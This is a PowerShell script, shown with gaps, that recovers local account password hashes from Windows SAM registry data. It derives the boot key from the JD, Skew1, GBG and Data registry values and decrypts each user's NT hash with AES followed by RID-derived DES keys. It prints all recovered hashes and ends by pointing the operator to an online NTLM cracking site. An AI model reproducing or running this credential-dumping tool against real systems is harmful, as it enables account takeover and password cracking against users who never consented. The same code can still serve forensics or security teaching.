...
function Convert-HexStringToByteArray {
    ...
    Write-Host "Processing HEX String: $HexString"
    ...
    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
        try {
            ...
            Write-Error "Failed to convert bytes at position $i`: $($_.Exception.Message)"
            return $null
        }
    }
...
class BootKeyExtractor {
        ...
        foreach ($match in $matches) {
            ...
            if ($content -match $vPattern) {
                ...
                if ($patternIndex -ne -1) {
                    Write-Host "Found Pattern at Offset: $patternIndex"
                    ...
                    Write-Host "IV Starts at: $ivStart"
                    Write-Host "Hash Data Starts at: $hashDataStart"
                    Write-Host "Extracted IV: $([BitConverter]::ToString($iv) -replace '-')`n"
    ...
    [hashtable]GetHashData() {
        return $this.HashData
    }

    [byte[][]]ComputeUserKeys([int]$RID) {
        $RIDBytes = [BitConverter]::GetBytes($RID)
        Write-Host "RID Bytes: $([BitConverter]::ToString($RIDBytes) -replace '-')"
        ...
        Write-Host "Initial Keys: ['$([BitConverter]::ToString($k[0]) -replace '-')', '$([BitConverter]::ToString($k[1]) -replace '-')']"
        ...
        for($i = 0; $i -lt 2; $i++) {
            ...
            for($j = 0; $j -lt 8; $j++) {
                $key[$j] = [byte](($key[$j] -shl 1) -band 0xFE)
            }

            Write-Host "Transformed Key $i`: $([BitConverter]::ToString($key) -replace '-')"
            $k[$i] = $key
        }
    ...
    [byte[]]DecryptAES([byte[]]$Key, [byte[]]$Value, [byte[]]$IV) {
        ...
        try {
            ...
            $Result = $AES.CreateDecryptor().TransformFinalBlock($Value, 0, $Value.Length)
    ...
    [void]DecryptUserHashes() {
        ...
        Write-Host "`n</> KEY INFORMATION </>"
        Write-Host "Combined LSA Key: $($this.Combined_LSA_key)"
        Write-Host "LSA Key: $($this.LSA_key)"
        Write-Host "Boot Key: $([BitConverter]::ToString($this.BootKey) -replace '-')`n"

        foreach ($RID in $RIDs) {
            Write-Host "`n<=== Processing User RID: 0x$('{0:X8}' -f $RID) ===>"
            
            $UserKeys = $this.ComputeUserKeys($RID)
            Write-Host "DES(K1): $([BitConverter]::ToString($UserKeys[0]) -replace '-')"
            Write-Host "DES(K2): $([BitConverter]::ToString($UserKeys[1]) -replace '-')"
            Write-Host ""
            
            Write-Host "Processing NT Hash:"
            
            if (-not $this.HashData.ContainsKey($RID)) {
                Write-Host "No Hash Data Found for RID: 0x$('{0:X8}' -f $RID)`n"
                continue
            }
            
            $ridData = $this.HashData[$RID]
            
            if ($null -eq $ridData.IV -or $ridData.IV.Length -ne 16) {
                Write-Host "Invalid IV Data for RID: 0x$('{0:X8}' -f $RID)"
                continue
            }
            
            if ($null -eq $ridData.EncryptedData -or $ridData.EncryptedData.Length -ne 32) {
                Write-Host "Invalid Encrypted Data for RID: 0x$('{0:X8}' -f $RID)"
                continue
            }
            
            Write-Host "Hash Data: $([BitConverter]::ToString($ridData.EncryptedData) -replace '-')"
            Write-Host "IV: $([BitConverter]::ToString($ridData.IV) -replace '-')"
            Write-Host "Boot Key: $([BitConverter]::ToString($this.BootKey) -replace '-')`n"
            
            $DecryptedNTHash = $this.DecryptAES($this.BootKey, $ridData.EncryptedData, $ridData.IV)
            
            if ($DecryptedNTHash -and $DecryptedNTHash.Length -gt 0) {
                Write-Host "NT Hash Decryption:"
                $FirstHalf = $DecryptedNTHash[0..7]
                $SecondHalf = $DecryptedNTHash[8..15]
                
                Write-Host "Input Data: $([BitConverter]::ToString($DecryptedNTHash) -replace '-')"
                Write-Host "First 8 Bytes: $([BitConverter]::ToString($FirstHalf) -replace '-')"
                Write-Host "Last 8 Bytes: $([BitConverter]::ToString($SecondHalf) -replace '-')"
                ...
                try {
                    ...
                    $DES1.Mode = [System.Security.Cryptography.CipherMode]::ECB
                    $DES1.Padding = [System.Security.Cryptography.PaddingMode]::None
                    $DES1.Key = Add-DESKeyParity $UserKeys[0]
                    
                    $DES2 = [System.Security.Cryptography.DES]::Create()
                    $DES2.Mode = [System.Security.Cryptography.CipherMode]::ECB
                    $DES2.Padding = [System.Security.Cryptography.PaddingMode]::None
                    $DES2.Key = Add-DESKeyParity $UserKeys[1]
                    
                    $Part1 = $DES1.CreateDecryptor().TransformFinalBlock($FirstHalf, 0, 8)
                    Write-Host "After DES(K1) First Half: $([BitConverter]::ToString($Part1) -replace '-')"
                    
                    $Part2 = $DES2.CreateDecryptor().TransformFinalBlock($SecondHalf, 0, 8)
                    Write-Host "After DES(K2) Second Half: $([BitConverter]::ToString($Part2) -replace '-')"
                    
                    $FinalHash = $Part1 + $Part2
                    Write-Host "Final NT Hash: $([BitConverter]::ToString($FinalHash) -replace '-')`n"
                    $AllHashes[$RID] = $FinalHash
                }
                finally {
                    if ($DES1) { $DES1.Dispose() }
                    if ($DES2) { $DES2.Dispose() }
                }
            }
        }

        Write-Host "`n</> ALL RETRIEVED NT HASHES </>"
        foreach ($RID in $AllHashes.Keys) {
            Write-Host "RID $([Convert]::ToString($RID, 16)) Hash: $([BitConverter]::ToString($AllHashes[$RID]) -replace '-')"
        }
    }
}
...
function Generate-Keys {
    ...
    Write-Host "`n</> BOOT KEY INITIALIZATION </>"
    Write-Host "Added JD: $JD"
    Write-Host "Added Skew1: $Skew1"
    Write-Host "Added GBG: $GBG"
    Write-Host "Added Data: $Data`n"
    ...
    if ($registry_data -match '"F"=hex:([^"]+)') {
        $f_data = $matches[1] -replace '\\|\s|,\r\n\s*',''
        Write-Host "F Data: $f_data"
        $f_bytes = Convert-HexStringToByteArray $f_data
        Write-Host "F Bytes Length: $($f_bytes.Length)"
...
try {
    ...
    Write-Host "[!] Decrypt Hashes: https://md5decrypt.net/en/Ntlm"
}
catch {
